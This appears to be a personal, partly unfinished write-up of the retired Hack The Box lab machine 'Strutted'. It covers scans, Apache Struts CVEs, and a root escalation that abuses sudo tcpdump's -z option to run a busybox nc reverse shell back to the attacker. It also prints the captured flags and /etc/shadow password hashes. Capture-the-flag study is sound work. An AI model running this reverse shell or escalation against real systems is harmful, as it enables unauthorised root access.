---
file_created: 05 Sep 2025 17:48
title: Strutted
difficulty: Medium
difficult_sort: 2
points: 0
os: Linux
target_ip: 10.10.11.59
platform: Hack The Box
category: B2R
box_status: Retired
url:
user_flag: true
root_flag: true
completed: false
date_finish: 2025-09-07
tags:
  - htb/machines
---
# Resolution summary
![400](<./attachments/Strutted-4.png>)

>[!summary]
>- Step 1
>- Step 2

## Tutorial
```cardlink
url: https://www.youtube.com/watch?v=p_Os7kOteO4
title: "Strutted | HTB Walkthrough"
description: "0:00 Introduction3:20 Remote Code Execution 110:56 Remote Code Execution 213:46 Stable Shell14:23 Initial Access18:01 Privilege Escalation"
host: www.youtube.com
favicon: https://www.youtube.com/s/desktop/814d40a6/img/favicon_32x32.png
image: https://i.ytimg.com/vi/p_Os7kOteO4/hqdefault.jpg
```
- [write-up](<./attachments/Strutted.pdf>)
- [medium](https://medium.com/@qinncade/strutted-htb-walkthrough-31bd09097eb0)
- [medium 2](https://medium.com/@CN-0x/strutted-hackthebox-write-up-d6d1c0ed9725)
## Improved skills

- Skill 1
- Skill 2
## Used tools
rustscan; nmap; gobuster

---
# Information Gathering

Scanned all TCP ports:
- `export IP="10.10.11.59"`
```bash
rustscan -a $IP -r 1-65535 -t 10000 --ulimit 5000

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Enumerated open TCP ports:

```bash
nmap -Pn -p 22,80 $IP-sCTV -vv -oN scans/nmap-open.tx

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Strutted\xE2\x84\xA2 - Instant Image Uploads
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumeration

## Port 80 - HTTP (Apache)
- Needs to redirect to `http://strutted.htb/`
```sh
echo "10.10.11.59 strutted.htb" | sudo tee -a /etc/hosts
```
### Gobuster
![](<./attachments/Strutted-1.png>)
`https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%2Fid%2FOIP.p5wZWNJ_CyoIsfbIrD2GRQHaGw%3Fpid%3DApi&f=1&ipt=38a20949d19165363f2bccc1c1fece202f25279423da04a911e834b22d059f0d&ipo=images`

---

# Exploitation
![](<./attachments/Strutted-2.png>)
You're using **Apache Struts version 6.3.0.1** (as shown in your Maven `<properties>`), along with other dependencies like Jetty and Jackson. Based on that setup, here are the known _critical vulnerabilities_ affecting your configuration:

| CVE            | Affected Versions | Severity | Recommendation              |
| -------------- | ----------------- | -------- | --------------------------- |
| CVE-2023-50164 | Up to 6.3.0.1     | Critical | Upgrade to 6.3.0.2 or newer |
| CVE-2024-53677 | Up to 6.3.0.2     | Critical | Upgrade to 6.4.0 or newer   |


- [magic byte](https://en.wikipedia.org/wiki/List_of_file_signatures)
---
# Lateral Movement to xxx

## Local enumeration


## Lateral movement vector

---
# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector
```sh
echo $'id\nbusybox nc 10.10.14.80 9001 -e /bin/bash' > pwn  
chmod +x pwn
```

```sh
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z ./pwn -Z root
```
---
# Trophy

## User Flag
```txt
400948114aa53710bbd820f04029ecaf
```
## Root Flag
```txt
05e10ddebd88e3473be72e56047deb13
```
## **/etc/shadow**

```txt
root:$y$j9T$4kM4HKyBvH.VNLjh.Zd60/$27BeC7cFIgPH.bVrllpoxXQwtc4tMCN6EZkI9Tqbw/B:20100:0:99999:7:::
james:$y$j9T$Agb7G27RJ0LCkmXQ3kDEK0$xoWkrSDF/pC4dkrIlBKe0LpYWCZH4YTz0NJ/zEn8.59:20100:0:99999:7:::
```

---
# Proof
![](<./attachments/Strutted-3.png>)